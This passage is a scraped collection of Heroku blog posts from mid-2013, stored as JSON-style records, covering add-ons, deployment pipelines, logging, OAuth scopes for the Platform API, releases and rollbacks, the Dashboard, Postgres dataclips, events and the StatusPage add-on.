more flexible, and lets you test and experiment with safety and confidence. Share dataclips. Run SQL queries against your data and share results in an easy, visual way with your team members. Dataclips can be downloaded or shared via URLs. The results will auto-refresh over time, and you can also view point-in-time snapshots. Fully managed. Heroku Postgres provides write-ahead logs backed up every 60 seconds, supports unmodified Postgres 9.2 by default, and makes it easy to set up replicas. We take care of operations, provisioning, upgrades and security. Heroku Postgres offers free and development tiers, as well as plans for larger apps . Make sure to read our documentation on choosing the right Heroku Postgres plan - many apps get a starter Heroku Postgres database by default, but it should be upgraded to a production tier plan before launch. Other popular options for persisting and sharing state include RedisToGo and MongoHQ. Caching heroku addons:add memcachier Caching is critical for web and mobile performance, significantly improving the response time and user experience of your app. MemCachier lets you add memcache to your production app on the Heroku platform, managing and scaling clusters of memcache servers behind the scenes so you can focus on using the exposed features. MemCachier provides stats on cache usage, lets you flush the cache from the web dashboard, and provides documentation for most languages supported on Heroku. You can start with 25MB free, then provision a plan based on how much memory you need as you grow. The Caching category in the Add-on Marketplace also includes IronCache, which supports the memcache protocol, and Cachely which is a rack middleware for Ruby on Rails apps. Monitoring heroku addons:add newrelic Monitoring provides peace-of-mind, problem detection and visibility into key indicators over time. When you provision the New Relic Heroku Add-on, it will create a private New Relic account and configure access for Heroku’s servers. Once you install the New Relic agent, the Add-on will begin monitoring your app right away, and provides SSO for login to New Relic’s dashboard. New Relic’s free Standard plan includes eight days of data retention, error detection, a look at database performance, and snapshots of front-end performance, health and availability. The Pro plan provides 90 days of data retention, proactive alerting, and more comprehensive data on performance, transactions, and more. Node.js developers can look to Nodetime for performance profiling and monitoring. For those that want to customize their dashboards, Librato is quick to setup and consumes data from your application logs. These and other options are in our Monitoring category. Next Steps When you're ready to move your app into production, make sure to try Production Check in your Heroku dashboard - this will test your app’s configuration against a set of highly recommended criteria around DNS, dyno redundancy, app monitoring and more. While this post explored some of our most popular Add-ons for production apps, Heroku has over 100 Add-ons for you to try, including push notifications, search, email and SMS, workers and queuing, analytics and more. To become an Add-on provider, check out our Provider Program . Docs for Heroku Add-ons are available in the Dev Center .", "date": "2013-07-08,"},
{"website": "Heroku", "title": "Heroku Labs: Managing App Deployment with Pipelines", "author": ["Michael Friis"], "link": "https://blog.heroku.com/heroku-pipelines-beta", "abstract": "Heroku Labs: Managing App Deployment with Pipelines Posted by Michael Friis July 10, 2013 Listen to this article Editor's Note: The version of Pipelines described in this blog post has been deprecated and replaced by a new non-labs implementation . Features added through Heroku Labs are experimental and may change or be removed without notice. heroku fork lets you create unique, running instances of existing applications in a single command , making it fast and simple to set up homogenous development, staging and production environments. But have you ever wished you could deploy directly from staging to a production app after testing and validation? Heroku pipelines , now an experimental feature available in Heroku Labs, lets you define the relationship between apps and easily promote a slug from one app to another. On Heroku, a slug is a bundle of your source, fetched dependencies, the language runtime, and compiled/generated output of the build system, ready for execution. Pipelines will copy the slug from the upstream app to the downstream app. Time to deploy is significantly faster as the slug is already compiled - pipelines simply copies and moves it to the downstream app. Pipelines also reduces the risk of accidentally pushing the wrong commit or deploying to the wrong environment, and makes it easier to manage your workflow so you can develop and test new features quickly, verify expected behavior, and release safely to end users. Here’s how to try it. Set Up Pipelines To use pipelines, you must first enable it in Heroku Labs: $ heroku labs:enable pipelines Then install the CLI plugin: $ heroku plugins:install git://github.com/heroku/heroku-pipeline.git Defining a Workflow If you don’t already have your application environments set up, use heroku fork to quickly spin up unique, homogeneous application environments from existing apps. You can then use these instances for various stages of your workflow. For this example, let’s assume that myapp-production is the name of your existing app, and you want to create a fork called myapp-staging : $ heroku fork -a myapp-production myapp-staging This will clone the source app’s precompiled slug and config-vars, re-provision the source app’s add-ons, copy over Heroku Postgres data (if present), and scale web processes to one dyno in the new myapp-staging environment. For more on heroku fork , its behaviors and limitations, read the blog post . Next, we use pipeline to map the relationship between the staging and production apps. In pipeline vocabulary, a production app is \"downstream\" from a staging app. Given a dev ---> staging ---> production pipeline, staging would be downstream of dev, and production downstream of staging. For simplicity’s sake, let’s set up a basic staging-to-production workflow between myapp-staging and myapp-production . Add the production app as the downstream environment: $ heroku pipeline:add -a myapp-staging myapp-production Confirm by calling heroku pipeline : $ heroku pipeline -a myapp-staging\nPipeline: myapp-staging ---> myapp-production Diff Between Application Environments Diff is a powerful tool for seeing changes between code, here extended to entire application environments. Diff against your downstream app: $ heroku pipeline:diff\nComparing myapp-staging to myapp-production ...done, myapp-staging ahead by 1 commit:\n73ab415  2013-07-07  A super important fix  (Shanley) Promote Changes Once you’ve defined a pipeline, you can deploy from one app to a downstream app with one command: $ heroku pipeline:promote\nPromoting myapp-staging to myapp-production...done, v2 This will copy the upstream app’s currently running slug to the downstream app as a new release. In this example, application changes made in staging will now be live and running in your production app, ready to serve end users. Pipelines only manage the application slug. Config vars, Add-ons and other environmental dependencies are not considered part of a pipeline and must be managed independently.  Similarly, pipeline doesn't update the downstream app's repository, so a heroku git:clone of a downstream app will not retrieve the latest code base. If you're adding application code that interacts with an Add-on, but that Add-on is not yet present in a downstream app, you'll want to provision the Add-on there before promoting application changes to it. Promoted changes by mistake, or need to roll back? Revert a promotion on the downstream app with heroku rollback to deploy a previous, known version of your code. Feedback? Heroku Labs lets us get experimental features out early and often so you can try them and tell us what you like and how we can improve. Check out our current Labs features , and email us at labs@heroku.com .", "date": "2013-07-10,"},
{"website": "Heroku", "title": "Video and Slides: Running Production Apps on Heroku", "author": ["Abe Pursell"], "link": "https://blog.heroku.com/running-production-apps-on-heroku", "abstract": "Video and Slides: Running Production Apps on Heroku Posted by Abe Pursell July 11, 2013 Listen to this article On June 27th, our customer advocate team presented the first webcast in a two-part series on running production apps on Heroku. In case you missed it, the recording and slides are below. This first session is designed for an audience familiar with Heroku basics and covers: Production app setup and expectations App production checklist Using Unicorn to increase app performance Using 2X dynos to increase app performance How to configure timeouts to ensure app stability Using log-runtime-metrics for added visibility Running Production Apps on Heroku 6.27.13 from Abe Pursell Resources from the presentation: Log2viz Log-runtime-metrics Getting Started with Unicorn Follower Database Which Postgres Plan is Right for You? Production Check Building Apps Efficiently on Heroku Bloat Script used in Demo Stay tuned. We'll be announcing the next part in the series soon.", "date": "2013-07-11,"},
{"website": "Heroku", "title": "Logging on Heroku", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/logging-on-heroku", "abstract": "Logging on Heroku Posted by Shanley Kane July 15, 2013 Listen to this article Logs tell the story of your app - a continuous, living stream of events, changes and behaviors. Logs let you rapidly identify and act on critical events, debug issues in your code, and analyze trends to make better decisions over time. But log management is increasingly complex. As apps scale across distributed infrastructure, many independent processes must be tracked and made sense of. Numerous components and backing services each produce their own log streams. Multiple developers may be collaborating on your app, and multiple services must consume its logs. And logs must be useful not only to machines and applications, but to the humans viewing them. Heroku brings simplicity and order back to logging. Heroku automatically collates and routes logs from every part of your app into a single channel, providing truly comprehensive, extensible, app-centric logging. Your log stream comes with rich command line functionality, is easy to plug into other services, and handles the heavy lifting of log management for you. This post presents Heroku's distributed logging platform, shows how to execute basic functions, and introduces logging services available with Heroku Add-ons . Finally, we take a look at two new, experimental logging tools available in Heroku Labs. Logplex: An Open Source, Distributed Logging Platform Logplex is Heroku’s distributed log routing and collation platform. Logplex uses a publish/subscribe model, merging and redistributing multiple incoming streams from various application components to individual subscribers. It’s open source, written primarily in Erlang, and relies on standard protocols and formats including syslog, stdout and HTTP. Logplex collects underlying events from the Heroku platform, API logs with administrative actions performed by you and your collaborators , and output from within your app, app server, installed libraries and any backing services that have been configured to publish to your stream. The result is a full story of your application - logs from every piece of the Heroku platform, each component of your app, all of its processes, and all changes made to it by you or your teammates. Working with Logs timestamp source[dyno]: message Logs on Heroku are designed to be human-readable, with an easy-to-parse format. Logs on Heroku consist of a timestamp, source, the name of the dyno that wrote the log, and the message. Anything written to stdout or stderr will automatically be routed and collated by Logplex. $ heroku logs --tail Run an open session to collect incoming logs right in your terminal, providing insight into live behavior as it happens for rapid debugging. $ heroku logs --source app Filter down to an individual source or dyno, i.e. app logs, logs from a particular dyno, or logs from the Heroku platform itself using simple commands like --source app (filters to only app logs) or --source heroku (filters to system logs such as crash processes, error pages, dynos coming up and down, etc). You can even filter to logs from specific dynos using --ps filtering arguments. Extensibility and Add-ons $ heroku addons:add papertrail Logplex maintains the last 1,500 lines of consolidated logs for your app and can be easily plugged into external services for long-term storage, monitoring, alerting and analysis. The Heroku Add-ons platform offers fully-managed tools including Loggly and Papertrail that automatically integrate with your Heroku logs and can be added to your app in a single command. You can also set up your own log drains so you can forward logs to any external syslog server. Logging for Teams 2013-07-06T12:00:01+00.00 heroku[api]: Release v3 created by email@example.com Heroku makes it easy to collaborate with other developers and members of the application team simply by adding them to an app . Heroku logging will not only display API logs, but which collaborator initiated commands, releases and other changes. Want to keep an audit log of all changes ever made to your app? Once you’ve set up an Add-on for log persistence, use it to search and filter all historical, developer-initiated events. Got lots of people working on your app at the same time? Open a logs --tail session and see all activity going on in the app in real time. Heroku logging supports team-wide visibility and makes it easier to construct the full picture of your app, narrow in on critical events, and identify problems or changes quickly. Labs Heroku Labs lets you enable and test experimental features on the platform. Here are two Labs features around logging we’re currently piloting. Please remember that Heroku Labs features are experimental only and may be changed or removed without notice. $ heroku labs:enable log-runtime-metrics\nEnabling log-runtime-metrics for myapp... done\n$ heroku restart log-runtime-metrics is a Labs feature that will give you in-depth per-dyno stats, including memory use, swap use, and load averages. These stats will appear as part of your app’s normal log stream. For additional information, check out the Dev Center article . $ heroku labs:enable http-request-id http-request-id lets you correlate router logs for a given web request against the web dyno logs for that same request. With a simple search of stored logs, look up events or messages correlated with a unique request ID. This helps you find the source of request errors, see how requests and application code may be resulting in behaviors at lower levels of the system, and get greater visibility into how various elements of your app are interacting. Better Logging for Better Development Logplex helps manage and deliver millions of messages every minute, managing the complexity of distributed logging so you can focus on making better decisions, solving problems fast, and using awesome services. Email us at labs@heroku.com to let us know what you think of log-runtime-metrics and http-request-id , and what you want to see next from Heroku logging.", "date": "2013-07-15,"},
{"website": "Heroku", "title": "Introducing a New How Heroku Works", "author": ["Jon Mountjoy"], "link": "https://blog.heroku.com/introducing-how-heroku-works", "abstract": "Introducing a New How Heroku Works Posted by Jon Mountjoy July 16, 2013 Listen to this article Humans, in their quest for knowledge, have always wanted to know how things work . We sit in our bedrooms, kitchens and garages pulling things apart with eager hands, examining the bits with a glimmer in our eye as our fingers turn them around and around, wondering what they do, how they do what they do–hoping that everything still works without that pretty residual part that no longer seems to fit. Introducing How Heroku Works How Heroku Works follows this well trodden path.  It dissects the platform, laying its innards bare upon the table, letting us gather around and look at what's inside. Look here, and see the muscular router pumping packets to and fro.  Look there, and see the dyno manager in all its glory, effortlessly orchestrating the platform. Look yonder and see the database's WAL-E continuously archiving data bits. And there, behold the dynos: like mitochondria they are the powerhouse of the platform, running your applications. History Like Galen's contributions to an early understanding of the human circulatory system, Heroku's venerable How it Works diagrams have been instrumental in advancing our understanding of Heroku. This monument to progress provided a pioneering map of the Heroku platform.  Etched with a surgeon's eye, its stylish and sleek lines drew praise from around the world, while its descriptive text provided some solace to those wanting to know more, wanting to understand how it worked . Going forward But we were left wanting. How, really, is the foot bone connected to the leg bone ?  How, really, is my code transformed from a git push into a slug into a release into something that executes, making use of config vars and third-party add-ons whilst unifying logging via logplex , all running on set of dynos , controlled by a dyno manager , hooked up to a router ? How Heroku Works is intended to answer these questions. The article provides a high-level, accurate, technical overview of the Heroku platform. Describing the platform required a certain balance.  Too detailed, and you'll get lost in the mire of minutiae.  Too broad, and you'll just have a caricature. We hope you appreciate this struggle, and the resulting text - which is generous in its linking to other documents that provide deeper material. Two views: static and dynamic It's difficult to describe an organism. Do you describe the body parts, and how they fit together (the static view, the deploy-time view ), or do you describe the journey of blood and electricity (the dynamic view, the run-time view )? How Heroku Works describes both–using words–in a story that takes you through a journey of the major components of the platform.  A sequential reading is necessary (some components are intertwined with others), but in the end you should have a pretty solid understanding of both the run-time and deploy-time views. You should be rewarded with a better understanding of how it all fits together - how you go from code to executing bits. Design choices This description of the Heroku platform is radically different from its predecessor.  Here are some of the design choices that went into its creation: Audience : we're assuming a much more technically savvy audience in this description.  You're tinkerers, makers.  You want to know how stuff works. Timing : this article is an optional read, but a really great read after deploying your first couple of apps . Language : while describing the platform we found a few terms that were a little too nebulous, so we changed them. The \"Routing Mesh\" is now simply called \"routers\".  \"Dyno Manifold\" is now called a \"Dyno manager\".  Both concisely describe the components, and don't require you to look up additional descriptions. Words : you will have to read - instead of gaze at awesome pictures. We'd love to iterate on this, and move it towards something that has a little more visual allure - but hope you instead enjoy an accuracy and detail difficult to depict in pretty pictures. Please use the feedback box at the bottom of the article to send me any feedback. Thank you! Jon", "date": "2013-07-16,"},
{"website": "Heroku", "title": "OAuth for Platform API in Public Beta", "author": ["Michael Friis"], "link": "https://blog.heroku.com/oauth-for-platform-api-in-public-beta", "abstract": "OAuth for Platform API in Public Beta Posted by Michael Friis July 22, 2013 Listen to this article In May, we launched the beta Heroku Platform API - making it possible to automate, extend and combine the Heroku platform with other services in a programmatic, self-service way. As of today, OAuth 2.0 support for the Platform API is available in public beta. With OAuth support, developers building integrations and services that use the Heroku API can provide a much better experience to their users. Instead of requesting full access to user accounts, access requests can be scoped to just the information and control a service needs. Instead of using one API key for all third-party services, users can check and revoke authorizations on a case-by-case basis. And users can manage all of their third-party authorizations within their Heroku dashboard . API Developers If you are building a service that uses the Platform API,  you should implement OAuth. First, register a client from the account page on Dashboard . You can then incorporate OAuth into your app using OmniAuth , the Heroku Bouncer middleware or another tool of your choice. The Heroku OAuth article has additional details, resources and links to sample apps. For Heroku Users With the Platform API, developers can now build awesome services that integrate with Heroku - for example, an iPhone app to monitor apps running on Heroku, or a CI service that can push changes to your apps so your workflow is smoother and more automated. However, these services need access to some or all of your Heroku account to work. OAuth gives you a safe mechanism to control this access. When a service uses OAuth to request access to your account, you will be redirected to id.heroku.com where you can see who is requesting access and the scope of the access requested. Here are the scopes we have implemented so far: global : Full access to account and to control all apps and resources. Equivalent to API key (but revocable). identity : Read-only access to account-info. read and write : Access to read and write info on apps and other resources, except configuration variables. This scope lets you grant access to your apps without necessarily revealing runtime secrets such as database connection strings. read-protected and write-protected : Same as above, but including access to config vars. Note that the read , write , read-protected and write-protected scopes do not grant access to account identity details such as email address. Before granting access to a 3rd party service, make sure that you trust that service to access your Heroku account in a way you feel comfortable with. You can see what external services are authorized on the account page on Dashboard or using the authorizations CLI command from the OAuth CLI plugin . You can revoke authorizations at any time using either the dashboard or Heroku CLI. OAuth gives 3rd parties services safe, granular and revocable access to the power of the Heroku Platform API. We can’t wait to see what new apps and services get built with these technologies. If you have questions, suggestions or want to show us what you have created, then drop us a line at api-feedback@heroku.com .", "date": "2013-07-22,"},
{"website": "Heroku", "title": "Releases and Rollbacks", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/releases-and-rollbacks", "abstract": "Releases and Rollbacks Posted by Shanley Kane July 25, 2013 Listen to this article Heroku tools let you create robust, healthy workflows for your apps, from development to production to ongoing delivery. Add other developers to your app with heroku sharing , create homogeneous staging and production apps with heroku fork , and quickly deploy directly from staging to production with pipelines . Deploying quickly and often is awesome, but with multiple developers and multiple deployments each day, how do you see and manage changes to your app over time? And what happens if you accidentally deploy bad code? We address these issues with two aspects of the Heroku platform - heroku releases and heroku rollback . heroku releases brings simplicity and visibility to application changes, letting you see releases made to your app, who made them, and when they occurred. With heroku rollback , you can rollback to a previous, known good release in a single command - providing a fast way to revert in case of bad deploys or config changes. In this post, we give a quick overview of releases and rollbacks on Heroku and how to use them. Releases Anytime you deploy code, change your config vars, or add, remove, upgrade or change an Add-on resource, Heroku creates a new release and restarts your app with the changes you made. To see the history of releases for an app: $ heroku releases\nRel   Change                   By                    When\n----  ----------------------   -------------------   -------------\nv52   Config add AWS_S3_KEY    shanley@heroku.com    5 minutes ago\nv51   Deploy de63889           kendra@heroku.com     7 minutes ago\nv50   Deploy 7c35f77           katie@heroku.com      3 hours ago The deploy string - in the above example, de63889 - corresponds to the commit hash in your Heroku remote git repository. Use this to correlate changes in a release with changes in your code repository. Call git log -n 1 de63889 to get more detailed information on the commit, including the full commit hash, exact timestamp, and commit message. You can get additional details on the release, including Add-ons present and config, by calling heroku releases:info vNN , where NN is the release number. Whenever a new release is created, NN is incremented and the release recorded on an append-only ledger. For example: $ heroku releases:info v24\n=== Release v24\nChange:   Deploy 575bfa8\nBy:       shanley@example.com\nWhen:     6 hours ago\nAddons:   deployhooks:email, releases:advanced\nConfig:\n  MY_CONFIG_VAR  => 42\n  RACK_ENV       => production Especially for apps that have several or many collaborators, release history helps teams work together with less friction and more visibility. When you start working each day, use release history to see what changes have been made to the app while you were away. Quickly look up commit information in the git logs for additional context. Check the release history before deploying changes to avoid a redundant commit or other error. And if something goes wrong, audit the release history to identify when bad code may have been rolled out. Rollbacks A release is more than just metadata about your app's history - it’s everything needed to run that version of your app. It consists of a full copy of any given releases’ config vars and its slug - a bundle of your source, fetched dependencies and compiled/generated output of the build system, ready for execution. This means you can rollback to a prior, known good version of an app quickly - no re-compilation is required. In the event you deploy bad code, use heroku rollback to restore the previous release. This lets you maintain uptime for your app even when things go wrong, and gives you time to fully dig into the problem and accurately diagnose and remedy it. To rollback to a specific release, specify the release number: $ heroku rollback v46\nRolling back test-rollback... done, v46 Your release history will reflect the rollback: $ heroku releases\nv47    Rollback to v46    shanley@heroku.com    2013-07-12 15:32:17 -0700 Note that the state of the database or any external state held in Add-ons used will not be recorded, so you'll have to reconcile that yourself in the case of a bad deployment. Please note that running a rolled-back version of your app is meant as a temporary fix so you can minimize negative impact to your users while you make the necessary changes to deploy a correct version of your code. Dashboard Heroku Dashboard provides a useful, beautiful GUI to see all of your apps and view and manage resources, collaborators, settings and more. You can also view release history and rollback directly from Dashboard via the activity tab within each app. Also in Dashboard, you can link your deploy hashes to GitHub by adding a repository on the settings page for your app. Then just click on the deploy hashes in the activity logs to see the full changelog on GitHub! Happy Workflows Combined with tools like fork , pipelines and collaborators, heroku releases and heroku rollback make for faster, safer and more flexible workflows. Releases gives you full visibility and history into your application, while rollbacks means you can recover quickly from accidental bad deploys with minimal impact to your users. For more information on releases and rollbacks, make sure to check out the Dev Center .", "date": "2013-07-25,"},
{"website": "Heroku", "title": "A Tour of Dashboard", "author": ["D. Keith Robinson"], "link": "https://blog.heroku.com/heroku-dashboard-tour", "abstract": "A Tour of Dashboard Posted by D. Keith Robinson July 31, 2013 Listen to this article When you sign into Heroku from your browser, you’re in the Heroku Dashboard . Dashboard is a personalized, interactive command center for all of your apps on Heroku. It provides simple visibility and management for app status, activity, resources, add-ons, collaborators, and other critical aspects of your app. You can also use it to manage all information about your Heroku account – from SSH keys to past invoices. In this post, we take a quick tour through Dashboard and some of its recent new features, including production check and notifications. Everything About Your Apps The first thing you'll see when you log in to Dashboard is the Apps page. Here, you can see a full list of all the apps you own or are a collaborator on – whether you have just one app or a whole portfolio you are working on. If there are pending collaboration requests, such as a request to transfer your app, that will appear as well. Use the search bar to easily locate a particular app in a long list. Favorite an app by clicking on the star – it will appear at the top of your list for easy access. The app icons next to each of the app names provide additional information about your app, such as if it isn’t currently running, or if the app is sleeping (apps with one dyno will “sleep” after one hour without any web traffic). You can also create an app directly from Dashboard. Simply click on \"Create a New App\", enter the app name (or let us pick one for you) and pick the region you want the app to live in. You'll get a remote Git repository to push code to and a unique URL on Heroku, just as if you'd used heroku create from the CLI . Dashboard also lets you drill into each app for more detailed visibility and management. Just click into the app on the apps list, and get a control panel for its resources, activity, collaborators and settings. Resources will show you dynos your app is consuming, as well as their process type, be it worker, web, queue or something else. You can even scale dynos directly from the interface. View all add-ons in use by the app, or add even more add-ons through the interface. Under Activity , see all releases made to your application, who made them, and when, to get immediate insight into recent changes. You can even use the Dashboard to rollback to a previous release in the event of a bad deploy. Collaborators will show you everyone who is a collaborator on the app, and even let you add additional collaborators. Finally, in Settings , set custom domains, find out the repo size,  and see critical information about your app including its Git URL and region. Production Check and Notifications We've been working hard at bringing more awesome functionality into Dashboard. The two newest features are production check and notifications center . Once you're viewing an app in Dashboard, use production check to run a series of tests on your app that we recommend for maintaining and monitoring availability – such as appropriate DNS configuration, dyno redundancy, and app and log monitoring. The Notifications Center is in the top right of your dashboard and delivers events that are relevant to you and your app - like new platform defaults, changes in add-on state, and modifications to billing. Account Information Finally, the Account section, which you can access through the dropdown menu on your user icon, lets you see and change lots of relevant account information – from basics like your password, name and email, to billing information, current usage and previous invoices. You can also use the settings section to add SSH keys, and to see all 3rd party applications built on the Heroku Platform API that have access to your account. You can revoke them right from the interface if you decide to revoke access. Feedback and Feature Requests We'd love to hear what you think in the comments below. Curious about new things we're working on for Dashboard? Join our beta program to get early access and provide feedback.", "date": "2013-07-31,"},
{"website": "Heroku", "title": "Video and Slides: Optimizing Production Apps on Heroku", "author": ["Abe Pursell"], "link": "https://blog.heroku.com/video_and_slides_optimizing_production_apps_on_heroku", "abstract": "Video and Slides: Optimizing Production Apps on Heroku Posted by Abe Pursell August 01, 2013 Listen to this article On July 31st, our customer advocate team presented the second webcast in a two-part series on production apps on Heroku. In case you missed it, the recording and slides are below. This second session is designed for an audience familiar with Heroku basics and covers: Using a CDN to increase app performance How to manage the asset pipeline Using heroku-pg-extras to gain visibility into database performance How to manage database migrations How to use a database follower for transactional and analytics database reads How to set up caching with Heroku add-ons Useful labs features Optimizing production apps on heroku 7.31.13 from Heroku Resources from the presentation: S3 Best Practices Postgres Performance Using PG Backups to Upgrade Heroku Postgres Databases Follower Database Octopus Gem Correctly Establishing Postgres Connections in Forked Environments PGBouncer Buildpack Caching and Performance Runtime Metrics Dyno Queuing Logging A summary of the first session in the series, Running Production Apps on Heroku, can be found here .", "date": "2013-08-01,"},
{"website": "Heroku", "title": "Improving Heroku Postgres with Support Data", "author": ["Chris Stolt"], "link": "https://blog.heroku.com/heroku-postgres-support-data", "abstract": "Improving Heroku Postgres with Support Data Posted by Chris Stolt August 06, 2013 Listen to this article We continuously use support data to identify high impact issues in our platform. Over the past couple of weeks in July, we reduced the volume of support inquiries related to Heroku Postgres by over a third — even as overall usage of the product increased. In this post, we'll tell you that story and a bit about how we do support here at Heroku. Identifying High-Impact Support Issues The way we approach customer support at Heroku is two-fold. On the surface, we’re here to answer your questions and help you fix issues with your apps. We also play an integral role advocating our customers’ needs within the company. The best support is the one you don't have to use, and as such, we strive to reduce the overall need to file tickets by bubbling support data up to the teams building the product. They then use this data to help guide their priorities. One way we do this is by generating regular reports from aggregate tickets over a given period of time. Using an internal app, we pull a random sample of tickets for a given product during the specified time period. We then size the sample to make human review feasible while retaining statistical significance. This app allows us to assign each sampled ticket a “culprit”, producing a high-level grouping of issues. The culprit may be a specific feature, a UI/UX issue or even general guidance and questions. We can also add a freeform note to each ticket. Here is a chart from a report that was created in early July for our Postgres product: Here we’re able to easily identify pgbackups and questions/guidance as the biggest contributors to customer pain on our Postgres offering. By drilling down into the ticket notes for those groups, we determined the main issue for pgbackups was a stability issue in capturing manual backups. In addition, we received a lot of queries about the use of automated backups versus when to rely on continuous protection. Taking Action With this data in hand, we’re able to show our product and engineering teams the very real impact that certain bugs or other issues have on our customers. In some cases, a support engineer can cut off the issue themselves by sending a pull request or updating docs and that's the end of it. With our pgbackups issue, we took this data to our engineering planning meeting and the Postgres team went on to tackle the issues. First, we introduced better instrumentation around the manual backup process which led to replacing the mechanism used to upload the backups to durable storage. We also wrapped this mechanism in retry logic, resulting in more stable backup captures. Finally, since we had determined more broad confusion around the purpose of continuous protection vs. pgbackups, we published new documentation to address the user questions we saw in support tickets. Of course, as with all software, there are more ways we can improve pgbackups and we will continue to do so. These actions together had a measurable impact on the following week’s report: In addition to the decrease in the questions/guidance and pgbackups categories, we also saw an overall reduction in Postgres-related tickets. This allows the next issue to surface. The notes from this new report indicate we have a lot of follow-up questions around our automated recovery notifications. The team is now exploring improving communication for these events. As we rinse and repeat, existing features become more and more solid and newly introduced features are quickly polished. Lessons Learned Any ticketing system holds a wealth of knowledge on customer pain points with a product. It's important to look at this data from an appropriate lens. If we look at it too narrowly, it’s difficult to spot trends. If we look at it too broadly, the data loses a lot of its meaning. Striking the right balance allows us to bring actionable data to our product teams that they can use to improve a product and enhance the user experience. Supplying our product and engineering teams with the data they need to make good decisions is one of the primary goals of our support team. We’ll explore more about how our support team works behind the scenes in future blog posts. Editor’s note: Support is available for all Heroku users through our Help app . For critical production apps and enterprises, our premium support offers guaranteed response times and 1:1 help in running your application.", "date": "2013-08-06,"},
{"website": "Heroku", "title": "How We Use Heroku Postgres Dataclips to Drive Our Business", "author": ["Shanley Kane"], "link": "https://blog.heroku.com/how-we-use-heroku-postgres-dataclips", "abstract": "How We Use Heroku Postgres Dataclips to Drive Our Business Posted by Shanley Kane August 07, 2013 Listen to this article Heroku Postgres brings the Heroku flow to your database, offering safe and straightforward provisioning, scaling, development and collaboration. Traditionally, generating and sharing data from within databases has been inconvenient and challenging. What if you could safely and easily capture and share the data you need to drive your business? Dataclips, available on all Heroku Postgres production and starter databases, let you run SQL queries against your data and share the results in an easy, visual way with your team members. Dataclips can be downloaded or shared via URLs, are downloadable and exportable in many formats, and are executed via a read-only transaction so your data stays safe. To get started with dataclips, check out our Dev Center article . Using Dataclips to Make Awesome Business Dashboards At Heroku, we integrate multiple dataclips into Google Docs Spreadsheets, and use the chart and graphing functionality to create custom dashboards. Recently, we used the GitHub API to extract data about our commits to Heroku repos over the past six months and store them in Heroku Postgres. We used dataclips to generate data for specific queries, such as total number of commits per day, top committers, and longest and shortest commit messages. We then integrated the dataclips into Google Spreadsheet, which automatically updates when new data is available, and used it to generate a dashboard of our GitHub activity over the past 6 months. Step 1 First, we use dataclips to query the dataset. In this example, we're querying the total number of GitHub commits by our teammates over the past six months, broken down by day. Step 2 When you create a dataclip, you can share the data easily using a URL. You can also use that URL to integrate the data with other business tools, like Google Docs. Generate a new Google Spreadsheet automatically from the drop down menu of your dataclip, or use the importData() function, shown below. This populates your spreadsheet with data from the dataclip, which will auto-update over time: Step 3 Once your data is integrated with your spreadsheet, you can use the built-in chart functionality to generate robust graphs and visualizations of the data: Please note that dataclips should NOT be used as an API. The options for endpoints (JSON, CSV, XLS) are great for low-volume background processes such as lightweight integrations and prototyping APIs , but does not replace a production API. Internal Use Cases Here are some other ways we use dataclips internally to drive our business. Postgres Business Dashboards Our Postgres team brings together multiple dataclips and integrates them with Google Docs, creating a full business dashboard. We import and graph dataclips related to the core health of the business, including overall revenue, how support issues break down by type of incident, attrition rate over time, database provisioning time, and the top users and customers. This gives us a full perspective into our business at any given time, and is easy to share within our company. Identifying Platform Abuse Dataclips also play an important role in identifying and addressing platform abuse. First, we identify trends that are correlated with or suggest abusive behavior such as spamming and phishing. Once we identify pattern that abusive attacks take, we can set up a dataclip that looks for actions matching the pattern. For example, sometimes we see sudden spikes in account creation from certain providers, but no additional platform activity - a pattern that can indicate spam operations. We use the JSON or CSV version of the dataclip to bring this data into abuse prevention apps for closer scanning. The lets our security team work better and faster - we don’t have to hardcode complicated queries into our apps, there is no need to redeploy if we want to change a query, and we don't have to give our security apps full access to the underlying databases - just to the behavior patterns we've identified. Creating a Data-Informed Business Data alone isn’t enough to create a business where meaningful metrics and quantitative insights are driving better business decisions, faster. Data must be omnipresent in your culture, easily accessible to all of your team members, shareable within and across departments, and flexible enough to integrate with existing business tools. Heroku Postgres dataclips unleashes your data so your team can put it to work.", "date": "2013-08-07,"},
{"website": "Heroku", "title": "Meet Heroku Events", "author": ["Tammy Contreras"], "link": "https://blog.heroku.com/meet_heroku_events", "abstract": "Meet Heroku Events Posted by Tammy Contreras August 08, 2013 Listen to this article Throughout the year we participate in a lot of conferences, hackathons, meet-ups, educational programs, and open source projects. At each and every one, we are inspired by the accomplishments, projects, and people we get to meet there. We welcome the opportunity to talk to you about your projects, answer your questions and share some awesome Heroku swag. If you see us at an event, please stop by and say \"Hi.\" Each month you can find out where Heroku will be by going to our events page , on Twitter , or on Facebook where you can also see where we've been. So what's happening in August? The month started off on August 3rd with Richard Schneeman @schneems and Harold Gimenez @hgmnz engaging Ruby attendees at Burlington Ruby Conference in Burlington, VT. PyCon Canada in it's second year, promises to be a busy one.  On August 9th Jacob Kaplan-Moss @ jacobian will be the opening keynote speaker, while Kenneth Reitz @kennethreitz will be \"Planting Open Source Seeds\" on August 10th.  We can also be found in the Expo Hall, where engineers are looking forward to meeting you and talking all thing Python. We are also excited to be supporting the [PyLadies Social[( http://pyladies-at-pyconca.eventbrite.com ) this year. Later in the month and 5,375 miles away, Designer and Node.js buildpack maintainer, Zeke Sikelianos @zeke is speaking at the BrazilJS Conf 2013 one of the world's largest Javascript conferences. He'll be speaking about crowdsourcing Heroku's Node.js buildpack and what we've learned from our open source community. Please check out our events page for a full listing of upcoming events. See you on the road!", "date": "2013-08-08,"},
{"website": "Heroku", "title": "StatusPage Add-On in Public Beta", "author": ["Robbie Th'ng"], "link": "https://blog.heroku.com/statuspage-addon-in-public-beta", "abstract": "StatusPage Add-On in Public Beta Posted by Robbie Th'ng August 14, 2013 Listen to this article Sharing your app’s status is critical for communicating and building trust with your users - whether it’s down for maintenance, experiencing problems with service providers, suffering from interruptions or performance problems, or up and running perfectly. Here at Heroku, we accomplish this with Heroku Status . But today, we’re introducing our first add-on that makes it easy to communicate app status with users of your app - StatusPage , now in public beta. StatusPage lets you build your own branded status page so you can share status information and public metrics about your app while also providing highly-available downtime communication. Enable the Heroku integration by setting a few environment variables in your app that will extend the error and maintenance pages Heroku serves automatically in the event your app encounters system-level errors or enters maintenance mode. StatusPage lets you present three major categories of status information in a branded experience. First, communicate the overall status of your platform, such as “All Systems Operational”, as well as the status of individual components and services: Then, communicate public metrics about your service, such as API uptime, error rate, or user activity. This communicates important data to existing users while also building trust with prospects. Metric data can be pulled from Librato, New Relic, 